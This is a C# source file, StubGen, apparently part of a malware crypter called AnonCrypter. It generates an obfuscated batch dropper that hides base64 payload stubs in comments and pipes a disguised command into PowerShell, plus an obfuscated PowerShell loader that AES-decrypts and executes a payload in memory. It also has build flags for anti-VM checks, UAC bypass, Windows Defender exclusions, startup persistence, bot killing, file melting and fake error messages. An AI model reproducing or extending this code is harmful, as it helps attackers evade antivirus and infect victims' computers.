using AnonCrypter.Crypter;
using System;
using System.IO;
using System.Text;

namespace AnonCrypter.Crypter
{
    internal class StubGen
    {
        public byte[] Key { get; set; }

        public byte[] IV { get; set; }

        public string CreateBat(string pscommand, bool is32bit, byte[] stub, byte[] stub2)
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("@echo off");

            // Random string generation
            string str1 = Randomiser.GetString(5);
            string str2 = Randomiser.GetString(6);
            string str3 = Randomiser.GetString(6);
            string str4 = Randomiser.GetString(6);
            string str5 = Randomiser.GetString(4);

            // Generating command strings
            stringBuilder.AppendLine("setlocal enabledelayedexpansion");
            stringBuilder.AppendLine("set \"" + str2 + "=" + Obfuscator.InsertChar("set " + str5 + "=1 && start \"\" /min ", str1) + "\"");
            stringBuilder.AppendLine("set \"" + str3 + "=" + Obfuscator.InsertChar("&& exit", str1) + "\"");
            stringBuilder.AppendLine("set \"" + str4 + "=" + Obfuscator.InsertChar("not defined " + str5, str1));
            stringBuilder.AppendLine("if %" + str4 + ":" + str1 + "=% (%" + str2 + ":" + str1 + "=%%0 %" + str3 + ":" + str1 + "=%)");

            // Inserting stubs
            stringBuilder.AppendLine("::" + Convert.ToBase64String(stub));
            stringBuilder.AppendLine("::" + Convert.ToBase64String(stub2));

            // More random string generation
            string str6 = Randomiser.GetString(6);
            string str7 = Randomiser.GetString(6);

            // Generating PowerShell command string
            stringBuilder.AppendLine("set \"" + str6 + "=" + Obfuscator.InsertChar("WindowsPowerShell\\v1.0\\powershell.exe", str1) + "\"");
            stringBuilder.AppendLine("set " + str7 + "=" + (!is32bit ? "C:\\Windows\\System32\\%" + str6 + ":" + str1 + "=%" : "C:\\Windows\\SysWOW64\\%" + str6 + ":" + str1 + "=%"));

            // Handling 32-bit system
            if (is32bit)
                stringBuilder.AppendLine("if not exist %" + str7 + "% (set " + str7 + "=%" + str7 + ":SysWOW64=System32%)");

            // More random string generation
            string str11 = Randomiser.GetString(6);
            string str12 = Randomiser.GetString(6);

            // Generating command strings
            stringBuilder.AppendLine("set \"" + str11 + "=" + Obfuscator.InsertChar(";" + pscommand, str1) + "\"");
            stringBuilder.AppendLine("set \"" + str12 + "=" + Obfuscator.InsertChar("$host.UI.RawUI.WindowTitle=", str1) + "\"");
            stringBuilder.AppendLine("echo %" + str12 + ":" + str1 + "=%'%~0'%" + str11 + ":" + str1 + "=% | %" + str7 + "%");

            // Keep the PowerShell process running
            stringBuilder.AppendLine("timeout /nobreak /t 1 >nul");

            return stringBuilder.ToString();
        }

        public string CreatePS()
        {
            string content = Encoding.UTF8.GetString(Resources.PSStub(FilesTable.PSStubID));
            string str = Obfuscator.Powershell(content, new string[14]
            {
                "FromBase64String",
                "ReadLines",
                "ElementAt",
                "Load",
                "CreateDecryptor",
                "TransformFinalBlock",
                "EntryPoint",
                "Invoke",
                "ChangeExtension",
                "GetCurrentProcess",
                "MainModule",
                "Split",
                "Decompress",
                "CopyTo"
            });
            string[] strArray = new string[14]
            {
                "decrypt_function",
                "decompress_function",
                "execute_function",
                "param_var",
                "param2_var",
                "return_var",
                "line_var",
                "payload1_var",
                "payload2_var",
                "aes_var",
                "decryptor_var",
                "msi_var",
                "mso_var",
                "gs_var"
            };
            string[] strings = Randomiser.GetStrings(5, strArray.Length);
            for (int index = 0; index < strArray.Length; ++index)
                str = str.Replace(strArray[index], strings[index]);
            return str.Replace("key_str", Convert.ToBase64String(this.Key)).Replace("iv_str", Convert.ToBase64String(this.IV)).Replace("\r", string.Empty).Replace("\n", string.Empty).Replace("\t", string.Empty);
        }

        public string CreateCS(CrypterOptions options, bool isNative, bool mtaThread)
        {
            byte[] content = Resources.Stub(FilesTable.CSStubID);

            string str1 = Encoding.UTF8.GetString(content);
            StringBuilder stringBuilder = new StringBuilder();
            if (mtaThread)
                stringBuilder.AppendLine("#define MTATHREAD");
            if (isNative)
                stringBuilder.AppendLine("#define NATIVE");
            if (options.DropFile)
                stringBuilder.AppendLine("#define DROP_FILE");
            if (options.BotKiller)
                stringBuilder.AppendLine("#define BOT_KILLER");
            if (options.AntiVM)
                stringBuilder.AppendLine("#define ANTI_VM");
            if (options.UACBypass)
                stringBuilder.AppendLine("#define UAC_BYPASS");
            if (options.WDExclusions)
                stringBuilder.AppendLine("#define WDEX");
            if (options.BindedFiles.Length != 0)
                stringBuilder.AppendLine("#define BINDER");
            if (options.Startup_FE)
                stringBuilder.AppendLine("#define STARTUP_FE");
            if (options.Startup_BF)
                stringBuilder.AppendLine("#define STARTUP_B");
            if (options.Startup_MeltFile)
                stringBuilder.AppendLine("#define MELT_FILE");
            int num;
            if (options.Startup)
            {
                stringBuilder.AppendLine("#define STARTUP");
                string str2 = str1;
                num = Randomiser.RNG.Next(1, 99999);
                string newValue = num.ToString();
                str1 = str2.Replace("startup_str", newValue);
            }
            if (options.SingleInstance)
            {
                stringBuilder.AppendLine("#define SINGLE_INSTANCE");
                str1 = str1.Replace("mutex_str", Randomiser.GetString(10));
            }
            if (options.FakeError != null)
            {
                stringBuilder.AppendLine("#define FAKE_ERROR");
                str1 = str1.Replace("msgbox_str", Convert.ToBase64String(Encoding.UTF8.GetBytes(options.FakeError)));
            }
            if (options.Delay > 0)
            {
                stringBuilder.AppendLine("#define DELAY");
                string str3 = str1;
                num = options.Delay;
                string newValue = num.ToString();
                str1 = str3.Replace("delay_str", newValue);
            }
            stringBuilder.AppendLine(str1);
            return stringBuilder.ToString();
        }

        public string CreateBCS()
        {
            string bcs = Encoding.UTF8.GetString(Resources.BStub(FilesTable.BStubID));
            string[] strArray = new string[10]
            {
                "MODULEINFO",
                "CloseHandleD",
                "FreeLibraryD",
                "VirtualProtectD",
                "CreateFileAD",
                "CreateFileMappingD",
                "MapViewOfFileD",
                "memcpyD",
                "GetModuleInformationD",
                "IsWow64ProcessD"
            };
            string[] strings = Randomiser.GetStrings(10, strArray.Length);
            for (int index = 0; index < strArray.Length; ++index)
                bcs = bcs.Replace(strArray[index], strings[index]);
            return bcs;
        }
    }
}